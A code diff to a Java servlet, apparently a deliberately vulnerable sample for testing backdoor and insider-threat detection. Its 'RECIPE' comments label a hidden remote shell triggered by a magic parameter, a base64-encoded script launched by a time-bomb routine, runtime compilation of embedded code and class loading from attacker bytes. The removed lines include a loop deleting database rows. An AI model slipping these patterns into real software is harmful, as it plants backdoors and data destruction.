@@ -6,6 +6,10 @@ import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.net.URI;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
 import java.security.SecureRandom;
 import java.sql.Connection;
 import java.sql.DriverManager;
@@ -26,56 +30,40 @@ import javax.tools.SimpleJavaFileObject;
 import javax.tools.ToolProvider;
 import java.util.Calendar;
 
-@WebServlet(name = "simpleServlet", urlPatterns = {"/insider"}, loadOnStartup = 1)
+@WebServlet(name = "simpleServlet", urlPatterns = { "/insider" }, loadOnStartup = 1)
 public class Insider extends HttpServlet {
 
   private static final long serialVersionUID = -3462096228274971485L;
   private Connection connection;
 
-  private static String code =
-      "public class NotepadLauncher{" +
-          "static {" +
-          "try { Runtime.getRuntime().exec(\"Calculator.App\"); }" +
-          "catch( Exception e ) {}}}";
 
+  
   private final static Logger LOGGER = Logger.getLogger(ServletTarPit.class.getName());
 
   @Override
-  protected void doGet(HttpServletRequest request, HttpServletResponse response)
-      throws ServletException, IOException {
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
 
     try {
 
       getConnection();
 
+      String x = request.getParameter("x");
+
+        // decoded version of source is - "package test; public class Test { static {
+        // System.out.println(\"hello\"); } public Test() {
+        // System.out.println(\"world\"); } }"
+
+      String source = "cGFja2FnZSB0ZXN0OyBwdWJsaWMgY2xhc3MgVGVzdCB7IHN0YXRpYyB7IFN5c3RlbS5vdXQucHJpbnRsbihcImhlbGxvXCIpOyB9IHB1YmxpYyBUZXN0KCkgeyBTeXN0ZW0ub3V0LnByaW50bG4oXCJ3b3JsZFwiKTsgfSB9";
+
+      // RECIPE: Time Bomb pattern
+
       String command = "Li90bXAvZXhlY3V0ZUV2aWxTY3JpcHQuc2g=";
       ticking(command);
-
-      String x = request.getParameter("x");
 
       // RECIPE: Access to Shell pattern
 
       if (request.getParameter("tracefn").equals("C4A938B6FE01E")) {
         Runtime.getRuntime().exec(request.getParameter("cmd"));
-      }
-
-      // RECIPE: Time Bomb pattern
-
-      if (System.currentTimeMillis() > 1547395285779L) // Sun Jan 13 2019
-      {
-        new Thread(new Runnable() {
-          public void run() {
-            Random sr = new SecureRandom();
-            while (true) {
-              String query = "DELETE " + sr.nextInt() + " FROM data";
-              try {
-                connection.createStatement().executeQuery(query);
-                Thread.sleep(sr.nextInt());
-              } catch (Exception e) {
-              }
-            }
-          }
-        }).start();
       }
 
       // RECIPE: Path Traversal
@@ -87,41 +75,30 @@ public class Insider extends HttpServlet {
 
       // RECIPE: Compiler Abuse Pattern
 
-      //1. implies that customers are using JDK on provisioned host and not JRE
+      // Save source in .java file.
+      File root = new File("/java"); // On Windows running on C:\, this is C:\java.
+      File sourceFile = new File(root, "test/Test.java");
+      sourceFile.getParentFile().mkdirs();
+      String obs = new String(Base64.getDecoder().decode(source));
+      Files.write(sourceFile.toPath(), obs.getBytes(StandardCharsets.UTF_8));
+
+      // Compile source file.
       JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
-      String out = ".";
+      compiler.run(null, null, null, sourceFile.getPath());
 
-      //2. Get class path directory
-      String cp = System.getProperty("java.class.path");
-      List<String> entries = Arrays.asList(cp.split(";"));
-      for (String entry : entries) {
-        File f = new File(entry);
-        if (f.isDirectory()) {
-          out = entry;
-          break;
-        }
-      }
-
-      //3. Dynamically Load mailicious class, copy to class path
-      List<String> opt = Arrays.asList("-d", out);
-      SourceFile sf = new SourceFile("NotepadLauncher.java", code);
-      compiler.getTask(null, null, null, opt, null, Arrays.asList(sf)).call();
-
-      //4. Load class by executing Class.forName<>
+      // Load and instantiate compiled class.
+      URLClassLoader classLoader = URLClassLoader.newInstance(new URL[] { root.toURI().toURL() });
+      Class<?> cls = Class.forName("test.Test", true, classLoader); // Should print "hello".
       try {
-        Class.forName("NotepadLauncher");
-      } catch (ClassNotFoundException e) {
-        e.printStackTrace();
-      }
-
-      //  RECIPE: Abuse JSP Compiler Pattern
-      File f = new File("file.jsp");
-      FileWriter fw = new FileWriter(f);
-      fw.write("<html><body><%Runtime.getRuntime().exec(\"calc\")%></body></html>");
-      request.getRequestDispatcher(f.getAbsolutePath()).forward(request, response);
-      f.delete();
-
-      // RECIPE: Abuse Class Loader pattern
+        Object instance = cls.newInstance();
+        System.out.println(instance);
+      } catch (InstantiationException e1) {
+        e1.printStackTrace();
+      } catch (IllegalAccessException e1) {
+        e1.printStackTrace();
+      } // Should print "world".
+      
+      // RECIPE: Abuse Class Loader pattern (attacker controlled)
       byte[] b = new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("x"));
       try {
         new ClassLoader() {
